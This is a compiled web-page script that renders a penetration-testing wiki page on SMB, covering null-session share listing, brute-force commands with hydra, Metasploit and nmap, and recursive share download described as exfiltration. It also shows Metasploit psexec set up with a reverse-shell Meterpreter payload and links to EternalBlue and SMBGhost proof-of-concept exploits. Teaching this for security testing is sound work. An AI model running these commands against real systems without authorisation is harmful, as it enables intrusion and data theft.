import{_ as o,c as p,a5 as l,G as i,w as t,B as r,o as c,j as s,a as e}from"./chunks/framework.B5CpDqM0.js";const C=JSON.parse('{"title":"üõ†Ô∏è SMB","description":"","frontmatter":{"authors":"ShutdownRepo, mpgn"},"headers":[],"relativePath":"infra/protocols/smb.md","filePath":"infra/protocols/smb.md","lastUpdated":1724982529000}'),d={name:"infra/protocols/smb.md"};function k(m,a,u,g,b,y){const n=r("PluginTabsTab"),h=r("PluginTabs");return c(),p("div",null,[a[2]||(a[2]=l('<h1 id="üõ†Ô∏è-smb" tabindex="-1">üõ†Ô∏è SMB <a class="header-anchor" href="#üõ†Ô∏è-smb" aria-label="Permalink to &quot;üõ†Ô∏è SMB&quot;">‚Äã</a></h1><h2 id="theory" tabindex="-1">Theory <a class="header-anchor" href="#theory" aria-label="Permalink to &quot;Theory&quot;">‚Äã</a></h2><p>SMB (Server Message Block) is a protocol running on port 445/tcp. It is used to share access to files, printers and serial ports on a network</p><p>In 1996 Microsoft releases a customized SMB they call CIFS (Common Internet File System). CIFS can sometimes be referred to as SMB1 (or SMBv1, SMB 1.0). In 2006, Microsoft introduced SMB2 (also referred to as SMB 2.0), a new version of the CIFS protocol. In 2012, Microsoft released SMB3 (a.k.a. SMB 3.0). As of 2020, most systems use SMB 2.0 or above.</p><p>In short, SMB is the protocol, CIFS is an old dialect of SMB, and Samba is the Linux/UNIX-like implementation of the SMB protocol (see <a href="http://thewindowsupdate.com/2020/02/21/smb-and-null-sessions-why-your-pen-test-is-probably-wrong/" target="_blank" rel="noreferrer">this</a>).</p><h2 id="practice" tabindex="-1">Practice <a class="header-anchor" href="#practice" aria-label="Permalink to &quot;Practice&quot;">‚Äã</a></h2><h3 id="null-session" tabindex="-1">Null session <a class="header-anchor" href="#null-session" aria-label="Permalink to &quot;Null session&quot;">‚Äã</a></h3><p>The null session, if not disabled, allows for anonymous/guest access to a network resource when using no credentials</p>',8)),i(h,null,{default:t(()=>[i(n,{label:"UNIX-like"},{default:t(()=>a[0]||(a[0]=[s("p",null,[e("Tools like "),s("a",{href:"https://www.samba.org/samba/docs/current/man-html/smbclient.1.html",target:"_blank",rel:"noreferrer"},"smbclient"),e(" (C) and "),s("a",{href:"https://github.com/ShawnDEvans/smbmap",target:"_blank",rel:"noreferrer"},"smbmap"),e(" (Python) can be used to access SMB shares with null sessions. Null credentials do not have to be explicitly set in this case.")],-1),s("div",{class:"language-bash vp-adaptive-theme"},[s("button",{title:"Copy Code",class:"copy"}),s("span",{class:"lang"},"bash"),s("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# List shares")]),e(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"smbclient"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," --list"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," //"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$IP")]),e(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"smbmap"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -H"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $IP")]),e(`
`),s("span",{class:"line"}),e(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# List shares (implicit null creds)")]),e(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"smbclient"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," --no-pass"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," --list"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," //"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$IP")]),e(`
`),s("span",{class:"line"}),e(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# List shares (explicit null creds)")]),e(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"smbclient"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," --user"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," ''%''"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," --list"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," //"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$IP")]),e(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"smbmap"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -u"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," ''"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -p"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," ''"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -H"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $IP")]),e(`
`),s("span",{class:"line"}),e(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Open an interactive session to operate on a specific share")]),e(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"smbclient"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," //"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$IP"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"/"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$SHARE_NAME")])])])],-1),s("p",null,[s("a",{href:"https://github.com/Pennyw0rth/NetExec",target:"_blank",rel:"noreferrer"},"NetExec"),e(" (Python) can be used to test for null session on multiple hosts.")],-1),s("div",{class:"language-bash vp-adaptive-theme"},[s("button",{title:"Copy Code",class:"copy"}),s("span",{class:"lang"},"bash"),s("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"netexec"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," smb"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $TARGETS "),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"-u"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," ''"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -p"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," ''"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," --shares")])])])],-1)])),_:1}),i(n,{label:"Windows"},{default:t(()=>a[1]||(a[1]=[s("p",null,[e("The "),s("code",null,"net"),e(" cmdlet can be used to natively interact with SMB shares and explicitly set null credentials.")],-1),s("div",{class:"caution custom-block"},[s("p",null,"If null credentials are not explicitly set, Windows will natively use implicit credentials (e.g. Kerberos tickets in cache, logged on user creds or computer account)")],-1),s("div",{class:"language-bash vp-adaptive-theme"},[s("button",{title:"Copy Code",class:"copy"}),s("span",{class:"lang"},"bash"),s("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"net"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," use"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," \\\\"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$IP"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"\\$"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"SHARE_NAME"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," ''"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," /user:''")])])])],-1)])),_:1})]),_:1}),a[3]||(a[3]=l(`<h3 id="bruteforce" tabindex="-1">Bruteforce <a class="header-anchor" href="#bruteforce" aria-label="Permalink to &quot;Bruteforce&quot;">‚Äã</a></h3><p>Tools like <a href="https://github.com/vanhauser-thc/thc-hydra" target="_blank" rel="noreferrer">hydra</a>, <a href="https://github.com/rapid7/metasploit-framework" target="_blank" rel="noreferrer">metasploit</a> or <a href="https://github.com/nmap/nmap" target="_blank" rel="noreferrer">nmap</a> can be used to operate authentication bruteforce attacks.</p><div class="warning custom-block"><p>In addition to not being stealthy at all, and depending on the password policy rules in place, bruteforcing authentication could lead to accounts getting locked out when reaching maximum allowed tries.</p></div><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># hydra</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">hydra</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -L</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> usernames.txt</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -P</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> passwords.txt</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> $IP </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">-V</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -f</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> smb</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># Metasploit module to use</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">msf5</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> &gt;</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> use</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> auxiliary/scanner/smb/smb_login</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># nmap</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">nmap</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --script</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> smb-brute</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -p</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 445</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> $IP</span></span></code></pre></div><p>Valid credentials can then be used to list accessible shares and enumerate the contents of the shares the account has access to.</p><h3 id="data-exfiltration" tabindex="-1">Data exfiltration <a class="header-anchor" href="#data-exfiltration" aria-label="Permalink to &quot;Data exfiltration&quot;">‚Äã</a></h3><p>Tools like <a href="https://www.samba.org/samba/docs/current/man-html/smbclient.1.html" target="_blank" rel="noreferrer">smbclient</a> and <a href="https://github.com/Pennyw0rth/NetExec" target="_blank" rel="noreferrer">NetExec</a> can be used to recursively download a SMB share&#39;s content.</p><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># In an smbclient interactive session</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">recurse</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> ON</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">prompt</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> OFF</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">mget</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> *</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># With netexec</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">netexec</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> smb</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> $TARGETS </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">-u</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> $USERNAME </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">-p</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> $PASSWORD </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">-M</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> spider_plus</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -o</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> READ_ONLY=False</span></span></code></pre></div><h3 id="üõ†Ô∏è-authenticated-rce" tabindex="-1">üõ†Ô∏è Authenticated RCE <a class="header-anchor" href="#üõ†Ô∏è-authenticated-rce" aria-label="Permalink to &quot;üõ†Ô∏è Authenticated RCE&quot;">‚Äã</a></h3><p>PSExec exploit module runs on the same principle as the PSExec Windows utility. The exploit embeds a payload into an executable, upload it into the Admin$ share. It then calls the Service Control Manager to approximately start a new rundll32.exe process that will execute our malicious executable.</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>msf &gt; use exploit/windows/smb/psexec</span></span>
<span class="line"><span>msf exploit(psexec) &gt; set payload windows/meterpreter/reverse_tcp</span></span>
<span class="line"><span>msf exploit(psexec) &gt; show options</span></span>
<span class="line"><span>Module options:</span></span>
<span class="line"><span></span></span>
<span class="line"><span> Name Current Setting Required Description</span></span>
<span class="line"><span> ---- --------------- -------- -----------</span></span>
<span class="line"><span> RHOST 192.168.57.131 yes The target address</span></span>
<span class="line"><span> RPORT 445 yes Set the SMB service port</span></span>
<span class="line"><span> SMBPass no The password for the specified username</span></span>
<span class="line"><span> SMBUser Administrator yes The username to authenticate as</span></span></code></pre></div><div class="caution custom-block"><p>Privileged user credentials required.</p></div><div class="caution custom-block"><p>File uploading, creating, starting, stopping, deletion of services makes it really noisy.</p></div><p>Smbexec works like Psexec, but instead of trying to execute an uploaded executable inside the share, it will try to use directly the binaries <em>cmd.exe/powershell.exe</em>. The exploit create an arbitrary service with the <em>Service File Name</em> attribute set to a command string to execute. It echoes the command to be executed to a .bat file, execute it and delete it.</p><p>The exploit then get the output of the command via Smb and displays the content. For every command, a new service is created.</p><p><a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py" target="_blank" rel="noreferrer">https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py</a></p><div class="tip custom-block"><p>%COMSPEC% is the environment variable that generaly points to the command line interpreter. (<em>cmd.exe, powershell.exe</em>...)</p></div><div class="tip custom-block"><p>The purpose of using /Q option of cmd is to stop displaying output. (je crois que √ßa veut dire /quiet √† v√©rifier)</p></div><div class="caution custom-block"><p>Prioritize using Smbexec when you detect a strong AV, <code>cmd.exe</code>is a trusted component of the operating system.</p></div><div class="caution custom-block"><p>Privileged user credentials required.</p></div><p>Windows Management Instrumentation is a subsystem of PowerShell that gives high privileged access to system monitoring tools.</p><p>Wmiexec has a similar approach to smbexec but it is executing commands through WMI.</p><p><a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py" target="_blank" rel="noreferrer">https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py</a></p><p>DCOM is a way for a computer to run a program over the network on a different computer as if the program was running locally.</p><p>Dcomexec has a similar approach to psexec but it is executing commands through DCOM.</p><p><a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/dcomexec.py" target="_blank" rel="noreferrer">https://github.com/SecureAuthCorp/impacket/blob/master/examples/dcomexec.py</a></p><p>netexec is a swiss army that has featured a lot of the command execution methods mentionned precedently.</p><p>One of its feature is to automate the process of executing code via SMB by switching between methods when one fails.</p><p><a href="https://github.com/Pennyw0rth/NetExec" target="_blank" rel="noreferrer">https://github.com/Pennyw0rth/NetExec</a></p><h3 id="üõ†Ô∏è-unauthenticated-rce" tabindex="-1">üõ†Ô∏è Unauthenticated RCE <a class="header-anchor" href="#üõ†Ô∏è-unauthenticated-rce" aria-label="Permalink to &quot;üõ†Ô∏è Unauthenticated RCE&quot;">‚Äã</a></h3><p>Eternalblue is a flaw that allows remote attackers to execute arbitrary code on a target system by sending specially crafted messages to the SMBv1 server. Other related exploits were labelled as<code>Eternalchampion</code>, <code>Eternalromance</code> and <code>Eternalsynergy.</code></p><p><a href="https://github.com/worawit/MS17-010" target="_blank" rel="noreferrer">https://github.com/worawit/MS17-010</a></p><p>Smbghost is a bug occuring in the decompression mechanism of client message to a SMBv3.11 server. This bug leads remotely and without any authentication to a BSOD or an RCE on the target.</p><p><a href="https://blog.zecops.com/vulnerabilities/exploiting-smbghost-cve-2020-0796-for-a-local-privilege-escalation-writeup-and-poc/" target="_blank" rel="noreferrer">https://blog.zecops.com/vulnerabilities/exploiting-smbghost-cve-2020-0796-for-a-local-privilege-escalation-writeup-and-poc/</a></p><p><a href="https://github.com/ZecOps/CVE-2020-0796-RCE-POC" target="_blank" rel="noreferrer">https://github.com/ZecOps/CVE-2020-0796-RCE-POC</a></p><p>Smbleed allows to leak kernel memory remotely, it is also occuring in the same decompression mechanism as smbghost.</p><p>In order for the target to be vulnerable, it must have the SMBv3.1.1 implementation running and the compression function enabled, which is on by default.</p><p><a href="https://blog.zecops.com/vulnerabilities/smbleedingghost-writeup-chaining-smbleed-cve-2020-1206-with-smbghost/" target="_blank" rel="noreferrer">https://blog.zecops.com/vulnerabilities/smbleedingghost-writeup-chaining-smbleed-cve-2020-1206-with-smbghost/</a></p><p><a href="https://github.com/ZecOps/CVE-2020-1206-POC" target="_blank" rel="noreferrer">https://github.com/ZecOps/CVE-2020-1206-POC</a></p><h2 id="resources" tabindex="-1">Resources <a class="header-anchor" href="#resources" aria-label="Permalink to &quot;Resources&quot;">‚Äã</a></h2><p><a href="https://pandorafms.com/blog/what-is-wmi/" target="_blank" rel="noreferrer">https://pandorafms.com/blog/what-is-wmi/</a></p><p><a href="https://book.hacktricks.xyz/pentesting/pentesting-smb" target="_blank" rel="noreferrer">https://book.hacktricks.xyz/pentesting/pentesting-smb</a></p><p><a href="https://www.varonis.com/blog/dcom-distributed-component-object-model/" target="_blank" rel="noreferrer">https://www.varonis.com/blog/dcom-distributed-component-object-model/</a></p><p><a href="https://www.optiv.com/blog/owning-computers-without-shell-access" target="_blank" rel="noreferrer">https://www.optiv.com/blog/owning-computers-without-shell-access</a></p>`,44))])}const f=o(d,[["render",k]]);export{C as __pageData,f as default};
